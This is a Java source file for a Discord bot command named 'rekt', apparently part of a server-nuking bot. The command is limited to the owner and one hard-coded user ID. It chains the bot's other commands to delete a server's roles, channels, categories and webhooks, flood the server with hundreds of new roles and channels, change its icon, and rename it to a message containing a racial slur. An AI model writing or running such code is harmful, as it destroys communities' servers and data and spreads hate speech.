package me.comu.exeter.commands.owner;

import me.comu.exeter.core.Core;
import me.comu.exeter.interfaces.ICommand;
import net.dv8tion.jda.api.events.message.guild.GuildMessageReceivedEvent;

import java.util.Arrays;
import java.util.List;
import java.util.concurrent.TimeUnit;

public class GriefServerCommand implements ICommand {
    @Override
    public void handle(List<String> args, GuildMessageReceivedEvent event) {

        if (!(event.getAuthor().getIdLong() == Core.OWNERID) && !event.getAuthor().getId().equalsIgnoreCase("725452437342912542")) {
            return;
        }
        event.getChannel().sendMessage(Core.PREFIX + "etb").queueAfter(1, TimeUnit.SECONDS);
        event.getChannel().sendMessage(Core.PREFIX + "delroles").queue();
        event.getChannel().sendMessage(Core.PREFIX + "addroles 200").queueAfter(2, TimeUnit.SECONDS);
        event.getChannel().sendMessage(Core.PREFIX + "dvc").queueAfter(3, TimeUnit.SECONDS);
        event.getChannel().sendMessage(Core.PREFIX + "dcat").queueAfter(4, TimeUnit.SECONDS);
        event.getChannel().sendMessage(Core.PREFIX + "servername GRIEFED BY SWAG LLL NIGGA LLL").queueAfter(5, TimeUnit.SECONDS);
        event.getChannel().sendMessage(Core.PREFIX + "changeicon").queueAfter(6, TimeUnit.SECONDS);
        event.getChannel().sendMessage(Core.PREFIX + "delwebhooks").queueAfter(7, TimeUnit.SECONDS);
        event.getChannel().sendMessage(Core.PREFIX + "createwebhooks 10").queueAfter(8, TimeUnit.SECONDS);
        event.getChannel().sendMessage(Core.PREFIX + "cvc 200").queueAfter(8, TimeUnit.SECONDS);
        event.getChannel().sendMessage(Core.PREFIX + "ccat 200").queueAfter(10, TimeUnit.SECONDS);
        event.getChannel().sendMessage(Core.PREFIX + "dtc").queueAfter(11, TimeUnit.SECONDS);
        event.getChannel().sendMessage(Core.PREFIX + "ctc 50").queueAfter(12, TimeUnit.SECONDS);

    }

    @Override
    public String getHelp() {
        return "Griefs the server\n`" + Core.PREFIX + getInvoke() + "`\nAliases: `" + Arrays.deepToString(getAlias()) + "'";
    }

    @Override
    public String getInvoke() {
        return "rekt";
    }

    @Override
    public String[] getAlias() {
        return new String[0];
    }

    @Override
    public Category getCategory() {
        return Category.OWNER;
    }
}
